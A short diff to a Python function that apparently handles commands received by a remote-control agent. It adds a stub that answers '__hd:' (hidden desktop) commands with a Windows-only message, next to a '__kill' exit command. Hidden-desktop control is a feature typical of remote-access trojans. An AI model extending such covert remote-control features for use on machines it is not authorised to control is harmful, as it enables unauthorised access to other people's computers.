@@ -90,6 +90,8 @@ def exchange(payload: str) -> str:
     return ''
 
 def execute_command(command: str) -> str:
+    if str(command).startswith('__hd:'):
+        return 'hidden desktop requires windows'
     if command == '__kill':
         sys.exit(0)
     try:
